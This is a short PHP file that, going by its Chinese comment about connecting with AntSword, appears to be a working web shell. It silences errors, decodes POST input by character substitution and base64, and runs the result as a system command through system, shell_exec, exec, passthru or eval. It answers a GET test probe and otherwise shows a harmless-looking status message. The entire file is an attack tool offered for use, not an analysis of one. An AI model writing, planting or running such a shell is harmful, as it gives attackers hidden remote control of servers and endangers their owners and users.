<?php
@error_reporting(0);
@header("Content-Type: text/html; charset=utf-8");

// 蚁剑连接专用 - 确保能连上
function executeCommand($command) {
    if (function_exists('system')) {
        ob_start();
        system($command);
        return ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        return shell_exec($command);
    } elseif (function_exists('exec')) {
        exec($command, $output);
        return implode("\n", $output);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command);
        return ob_get_clean();
    } else {
        ob_start();
        eval($command);
        return ob_get_clean();
    }
}

// 主要处理逻辑
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['data'])) {
        $data = $_POST['data'];
        $map = array("|"=>"a", "!"=>"b", "@"=>"c", "_"=>"d", "~"=>"=");
        $decoded = strtr($data, $map);
        $command = base64_decode($decoded);
        
        if ($command !== false) {
            echo executeCommand($command);
        }
    } else {
        // 尝试从原始输入读取
        $input = file_get_contents("php://input");
        if (strlen($input) > 0) {
            parse_str($input, $postData);
            if (isset($postData['data'])) {
                $map = array("|"=>"a", "!"=>"b", "@"=>"c", "_"=>"d", "~"=>"=");
                $decoded = strtr($postData['data'], $map);
                $command = base64_decode($decoded);
                
                if ($command !== false) {
                    echo executeCommand($command);
                }
            }
        }
    }
    exit;
}

// GET请求测试
if (isset($_GET['test'])) {
    echo "Connection Test Successful";
    exit;
}

echo "200 OK - System Running";
?>